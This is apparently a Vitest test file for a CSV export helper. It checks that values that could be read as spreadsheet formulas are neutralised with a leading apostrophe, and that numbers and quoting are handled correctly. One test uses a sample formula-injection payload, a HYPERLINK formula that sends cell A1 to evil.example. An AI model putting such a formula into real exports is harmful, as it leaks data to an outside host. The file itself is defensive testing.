import { describe, expect, it } from "vitest";
import { toCsv } from "../src/lib/csv.js";

// The export is a file a member of staff opens on their own machine, and
// what's in it was typed by people. A cell starting =, +, - or @ is a
// formula to Excel and Sheets, and runs when the file is opened.
const line = (csv: string, n = 1) => csv.split("\r\n")[n]!;

describe("CSV export", () => {
  it("stops a spreadsheet running what somebody typed", () => {
    const row = line(toCsv([{ notes: '=HYPERLINK("http://evil.example/?"&A1,"Click")' }]));
    expect(row.startsWith("=")).toBe(false);
    expect(row).toContain("'=HYPERLINK");
  });

  it.each(["=1+1", "+1 555 0100", "-x", "@SUM(A1)", "\tstart", "\rstart"])("neutralises a cell starting %j", (value) => {
    const cell = line(toCsv([{ v: value }])).replace(/^"|"$/g, "");
    // The apostrophe has to be the first thing in the cell, not merely
    // present, for a spreadsheet to read the cell as text.
    expect(cell[0]).toBe("'");
    expect(cell.slice(1)).toBe(value);
  });

  // A billing export carries amounts; "-45.00" must stay a number.
  it.each(["-45.00", "+3", "-1", "42", "0.5"])("leaves the plain number %j alone", (value) => {
    expect(line(toCsv([{ v: value }]))).toBe(value);
  });

  it("leaves an ordinary value exactly as it was", () => {
    expect(line(toCsv([{ name: "Okonkwo, Dana" }]))).toBe('"Okonkwo, Dana"');
    expect(line(toCsv([{ n: 42 }]))).toBe("42");
  });

  it("quotes and doubles quotes, and quotes line breaks of either kind", () => {
    expect(line(toCsv([{ v: 'she said "no"' }]))).toBe('"she said ""no"""');
    expect(toCsv([{ v: "a\rb" }])).toBe('v\r\n"a\rb"');
    expect(toCsv([{ v: "a\nb" }])).toBe('v\r\n"a\nb"');
  });

  it("guards the header row too", () => {
    expect(line(toCsv([{ "=cmd": 1 }]), 0)).toBe("'=cmd");
  });

  it("keeps column order as given, and writes nothing for missing values", () => {
    expect(toCsv([{ b: 1, a: null, c: undefined }])).toBe("b,a,c\r\n1,,");
    expect(toCsv([])).toBe("");
  });
});
